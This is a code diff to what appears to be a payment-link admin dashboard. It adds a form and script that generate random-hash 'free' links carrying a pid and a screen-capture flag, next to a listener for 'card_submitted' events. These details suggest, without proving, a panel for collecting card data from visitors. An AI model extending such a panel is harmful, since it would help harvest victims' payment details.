@@ -588,6 +588,23 @@
       </div>
     </div>
 
+    <!-- New section for generating free links -->
+<div class="generate-link">
+  <h2>Generate Free Link</h2>
+  <form id="generateFreeLinkForm">
+    <div class="form-group">
+      <label>Description (Optional)</label>
+      <textarea id="freeDescription" rows="2" placeholder="Enter description if needed"></textarea>
+    </div>
+    <button type="submit" style="background-color: #22c55e;">Generate Free Link</button>
+  </form>
+  <div id="freeLinkContainer" class="payment-link" style="display: none;">
+    <span>Free Link: </span>
+    <span id="freeLink"></span>
+    <button class="copy-btn" onclick="copyFreeLink()">Copy</button>
+  </div>
+</div>
+    
     <!-- New section for expiring payment links -->
     <div class="generate-link">
       <h2>Expire Payment Link</h2>
@@ -2240,6 +2257,106 @@ socket.on('card_submitted', (data) => {
       }
     }
 
+    // Copy Free Link
+function copyFreeLink() {
+  const link = document.getElementById('freeLink').textContent;
+  navigator.clipboard.writeText(link);
+  alert('Free link copied!');
+}
+
+// Free Link Generation
+document.getElementById('generateFreeLinkForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const descInput = document.getElementById('freeDescription');
+  const linkContainer = document.getElementById('freeLinkContainer');
+
+  try {
+    linkContainer.style.display = 'none';
+    const description = descInput.value.trim();
+
+    // Show loading indication
+    const btn = e.target.querySelector('button[type="submit"]');
+    const originalText = btn.textContent;
+    btn.textContent = 'Generating...';
+    btn.disabled = true;
+
+    const response = await fetch('/api/generateFreeLink', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        description,
+        isFreeLink: true,
+        includeScreenCapture: true
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) throw new Error(data.message || 'Generation failed');
+
+    console.log('Server response for free link:', data);
+    
+    // Extract the pid from the original URL
+    const originalLink = data.paymentLink;
+    console.log('Original free link:', originalLink);
+    
+    let pid;
+    
+    // Try to extract pid from URL query parameters
+    try {
+      const url = new URL(originalLink);
+      pid = url.searchParams.get('pid');
+    } catch (e) {
+      console.log('Error parsing URL, trying alternative extraction:', e);
+      
+      // Fallback to manual extraction
+      const queryPart = originalLink.split('?')[1];
+      if (queryPart) {
+        const params = new URLSearchParams(queryPart);
+        pid = params.get('pid');
+      }
+    }
+    
+    // Validate we have a pid
+    if (!pid) {
+      // Try one more method - direct extraction using regex
+      const pidMatch = originalLink.match(/[?&]pid=([^&]+)/);
+      if (pidMatch && pidMatch[1]) {
+        pid = pidMatch[1];
+      } else {
+        throw new Error('Could not extract payment ID from link');
+      }
+    }
+    
+    console.log('Extracted PID for free link:', pid);
+    
+    // Generate random hash for the URL (6 characters, alphanumeric)
+    const randomHash = Math.random().toString(36).substring(2, 8);
+
+    // Create a clean URL with just the hash and add free=true parameter
+    const origin = window.location.origin;
+    const hashUrl = `${origin}/${randomHash}?pid=${pid}&free=true`;
+    
+    document.getElementById('freeLink').textContent = hashUrl;
+    linkContainer.style.display = 'block';
+    showMessage('success', 'Free payment link generated successfully!');
+    
+    // Reset button state
+    btn.textContent = originalText;
+    btn.disabled = false;
+  } catch (error) {
+    console.error('Error generating free link:', error);
+    alert(`Error: ${error.message}`);
+    linkContainer.style.display = 'none';
+    
+    // Reset button state
+    const btn = e.target.querySelector('button[type="submit"]');
+    if (btn) {
+      btn.textContent = 'Generate Free Link';
+      btn.disabled = false;
+    }
+  }
+});
+    
     // Mark transaction as viewed
     async function markTransactionViewed(id) {
       try {
